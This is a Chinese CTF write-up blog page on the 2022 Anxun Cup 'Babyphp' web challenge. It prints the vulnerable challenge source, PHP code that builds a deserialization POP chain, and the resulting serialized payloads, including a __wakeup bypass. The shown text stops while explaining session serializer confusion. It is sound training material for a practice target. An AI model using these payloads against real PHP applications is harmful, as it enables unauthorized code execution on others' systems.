@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="题目：  Babyphp(2022安洵杯) Babyweb(2023安洵杯春季赛)   Babyphp(2022安洵杯)官方wp：https:&#x2F;&#x2F;bbs.kanxue.com&#x2F;thread-275369.htm BabyPHP知识点：session反序列化（pop链）-&gt;soap(ssrf+crlf)-&gt;call_user_func激活soap类 参考博客1 参考博客2 题目源码： 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第五届安洵杯-2022-web-writeup">
+<meta property="og:url" content="http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/index.html">
+<meta property="og:site_name" content="psych&#39;s blog">
+<meta property="og:description" content="题目：  Babyphp(2022安洵杯) Babyweb(2023安洵杯春季赛)   Babyphp(2022安洵杯)官方wp：https:&#x2F;&#x2F;bbs.kanxue.com&#x2F;thread-275369.htm BabyPHP知识点：session反序列化（pop链）-&gt;soap(ssrf+crlf)-&gt;call_user_func激活soap类 参考博客1 参考博客2 题目源码： 1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230707013038305-1024x357.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221201175904124-1-1024x227.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221201175845894-1-1024x91.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230308203346357.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230309075600961.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230309085711588-1024x196.png">
+<meta property="article:published_time" content="2023-07-06T10:12:22.000Z">
+<meta property="article:modified_time" content="2023-08-16T15:14:39.925Z">
+<meta property="article:author" content="psych">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230707013038305-1024x357.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>第五届安洵杯-2022-web-writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/07/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/07/01/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-2022-web-%E9%83%A8%E5%88%86wp%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&text=第五届安洵杯-2022-web-writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&title=第五届安洵杯-2022-web-writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&is_video=false&description=第五届安洵杯-2022-web-writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第五届安洵杯-2022-web-writeup&body=Check out this article: http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&title=第五届安洵杯-2022-web-writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&title=第五届安洵杯-2022-web-writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&title=第五届安洵杯-2022-web-writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&title=第五届安洵杯-2022-web-writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&name=第五届安洵杯-2022-web-writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&t=第五届安洵杯-2022-web-writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Babyphp-2022%E5%AE%89%E6%B4%B5%E6%9D%AF"><span class="toc-number">1.</span> <span class="toc-text">Babyphp(2022安洵杯)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BabyPHP"><span class="toc-number">2.</span> <span class="toc-text">BabyPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pop%E9%93%BE"><span class="toc-number">2.1.</span> <span class="toc-text">pop链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pop%E9%93%BE-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">pop链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0exp"><span class="toc-number">2.1.2.</span> <span class="toc-text">构造exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.</span> <span class="toc-text">session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.2.0.0.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8A%84%EF%BC%9Ahurrison%E4%BD%AC%E7%9A%84wp"><span class="toc-number">2.2.0.0.2.</span> <span class="toc-text">抄：hurrison佬的wp</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%98%E6%96%B9wp"><span class="toc-number">2.2.0.0.3.</span> <span class="toc-text">官方wp</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">2.3.</span> <span class="toc-text">补充</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">session 反序列化机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%BA%E5%88%B6"><span class="toc-number">2.3.0.2.</span> <span class="toc-text">机制</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">2.3.0.2.1.</span> <span class="toc-text">默认机制</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%87%AA%E5%AE%9A%E4%B9%89session%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6"><span class="toc-number">2.3.0.2.2.</span> <span class="toc-text">用户自定义session处理机制</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%95%E6%93%8E"><span class="toc-number">2.3.0.3.</span> <span class="toc-text">引擎</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.3.0.4.</span> <span class="toc-text">漏洞实例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.0.5.</span> <span class="toc-text">PHP原生类的利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CRLF%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.0.6.</span> <span class="toc-text">CRLF攻击</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Babyweb-2023%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B"><span class="toc-number">3.</span> <span class="toc-text">Babyweb(2023安洵杯春季赛)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP1-0"><span class="toc-number">3.1.</span> <span class="toc-text">PHP1.0</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.0.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.1.0.3.</span> <span class="toc-text">代码实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP2-0"><span class="toc-number">3.2.</span> <span class="toc-text">PHP2.0</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-number">3.2.0.2.</span> <span class="toc-text">LD_PRELOAD</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.0.3.</span> <span class="toc-text">环境变量注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload"><span class="toc-number">3.2.0.4.</span> <span class="toc-text">最终payload</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        第五届安洵杯-2022-web-writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">psych</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-07-06T10:12:22.000Z" class="dt-published" itemprop="datePublished">2023-07-06</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>题目：</p>
+<ul>
+<li>Babyphp(2022安洵杯)</li>
+<li>Babyweb(2023安洵杯春季赛)</li>
+</ul>
+<hr>
+<h2 id="Babyphp-2022安洵杯"><a href="#Babyphp-2022安洵杯" class="headerlink" title="Babyphp(2022安洵杯)"></a>Babyphp(2022安洵杯)</h2><p>官方wp：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-275369.htm">https://bbs.kanxue.com/thread-275369.htm</a></p>
+<h2 id="BabyPHP"><a href="#BabyPHP" class="headerlink" title="BabyPHP"></a>BabyPHP</h2><p>知识点：session反序列化（pop链）-&gt;soap(ssrf+crlf)-&gt;call_user_func激活soap类</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11515519.html">参考博客1</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2NDgyNTAzMw==&mid=2247484241&idx=1&sn=76c9bba70fd81bffa4f4d6919d7b98cd&chksm=ce6238f7f915b1e15b477d625f08c318de6c0532079d8c22a135e410b964c9dc3234f13db680&mpshare=1&scene=23&srcid=1128PSR0BFXYuDzkmnCay6z3&sharer_sharetime=1669595430468&sharer_shareid=93d3023652ea1e4f581f6748f20cfe90#rd">参考博客2</a></p>
+<p>题目源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">///index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//something in flag.php</span><br><span class="line"></span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a = &quot;babyhacker&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        if (isset($this-&gt;a) &amp;&amp; $this-&gt;a == md5($this-&gt;a)) &#123;         //md5，0e绕过</span><br><span class="line">            $this-&gt;b-&gt;uwant();                                      // b是class C</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $k;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;b = $this-&gt;k;</span><br><span class="line">        die($this-&gt;a);                    //跳到tostring()所以$this-&gt;a=class C</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $cc = $this-&gt;c;</span><br><span class="line">        return $cc();                  //调用函数，预计跳到A里面的invoke</span><br><span class="line">    &#125;</span><br><span class="line">    public function uwant()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;a == &quot;phpinfo&quot;) &#123;          //a=phpinfo可以直接看PHPinfo</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            call_user_func(array(reset($_SESSION), $this-&gt;a));        //或者重写a</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;d0g3&#x27;])) &#123;             </span><br><span class="line">    ini_set($_GET[&#x27;baby&#x27;], $_GET[&#x27;d0g3&#x27;]);  //ini_set(&#x27;session.serialize_handler&#x27;, &#x27;设置的引擎&#x27;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&#x27;sess&#x27;] = $_POST[&#x27;sess&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    session_start();</span><br><span class="line">    if (isset($_POST[&quot;pop&quot;])) &#123;</span><br><span class="line">        unserialize($_POST[&quot;pop&quot;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">///flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//flag在根目录下</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;          //ssrf</span><br><span class="line">    $f1ag=implode(array(new $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;])));</span><br><span class="line">    $_SESSION[&quot;F1AG&quot;]= $f1ag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   echo &quot;only localhost!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h3><p>链子触发是通过<code>unserialize($_POST[&quot;pop&quot;]);</code>；反序列化post的pop。</p>
+<p>链子入口是class b里面的 <code>__destruct()</code>;</p>
+<p>链子的跳板就是class a 里面的 <code>__invoke()</code>;</p>
+<p>链子的出口应该是class c里面的<code>__uwant</code> <code>call_user_func(array(reset($_SESSION), $this-&gt;a));</code></p>
+<blockquote>
+<p><code>call_user_func</code>:把第一个参数作为回调函数调用,数组中第一个元素为类名，第二个元素为类方法。【第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。 <strong>前者函数后者参数</strong>】，session这个函数就很可疑了</p>
+<p><code>reset</code>:输出数组中的当前元素和下一个元素的值，然后把数组的内部指针重置到数组中的第一个元素</p>
+<p>也就是说:reset() 函数将内部指针指向数组中的第一个元素，并输出。</p>
+</blockquote>
+<h4 id="pop链-1"><a href="#pop链-1" class="headerlink" title="pop链"></a>pop链</h4><p>链子 B-&gt;a&#x3D;class C -&gt; C-&gt;c&#x3D;class A -&gt; A -&gt;a&#x3D;0e··· ; A-&gt;b&#x3D;class C</p>
+<p><strong>class B __destruct -&gt; class C __tostring()-&gt;class A __invoke -&gt;class C __uwant</strong></p>
+<h4 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $a = &#x27;0e215962017&#x27;;</span><br><span class="line">    public $b;</span><br><span class="line">       public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        if (isset($this-&gt;a) &amp;&amp; $this-&gt;a == md5($this-&gt;a)) &#123;</span><br><span class="line">            $this-&gt;b-&gt;uwant();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $k;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;b = $this-&gt;k;</span><br><span class="line">        die($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C </span><br><span class="line">&#123;</span><br><span class="line">      public $a ;</span><br><span class="line">      public $c;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $cc = $this-&gt;c;</span><br><span class="line">        return $cc();</span><br><span class="line">    &#125;</span><br><span class="line">    public function uwant()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;a == &quot;phpinfo&quot;) &#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            call_user_func(array(reset($_SESSION), $this-&gt;a));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">$b = new B();</span><br><span class="line">$c = new C();</span><br><span class="line">$b -&gt; a = $c;</span><br><span class="line">$b -&gt;a -&gt; c = $a</span><br><span class="line">$a -&gt; b = $c;</span><br><span class="line">$c -&gt; a = &#x27;phpinfo&#x27;;</span><br><span class="line">echo (serialize($b));</span><br></pre></td></tr></table></figure>
+
+<p>得到payload</p>
+<p><code>O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:11:&quot;0e215962017&quot;;s:1:&quot;b&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;c&quot;;N;&#125;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;k&quot;;N;&#125;</code></p>
+<p>改一下参数绕过wakeup</p>
+<p><code>O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;O:1:&quot;A&quot;:3:&#123;s:1:&quot;a&quot;;s:11:&quot;0e215962017&quot;;s:1:&quot;b&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;c&quot;;N;&#125;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;k&quot;;N;&#125;</code></p>
+<h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p>思路： <strong>session反序列+soap(ssrf+crlf)+call_user_func激活soap类</strong></p>
+<h6 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;d0g3&#x27;])) &#123;             </span><br><span class="line">    ini_set($_GET[&#x27;baby&#x27;], $_GET[&#x27;d0g3&#x27;]);  //ini_set(&#x27;session.serialize_handler&#x27;, &#x27;设置的引擎&#x27;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&#x27;sess&#x27;] = $_POST[&#x27;sess&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>对于这段代码，我们<code>ini_set($_GET[&#39;baby&#39;], $_GET[&#39;d0g3&#39;]); 构造成ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</code>[之前phpinfo可以查看到本来的引擎为php]</li>
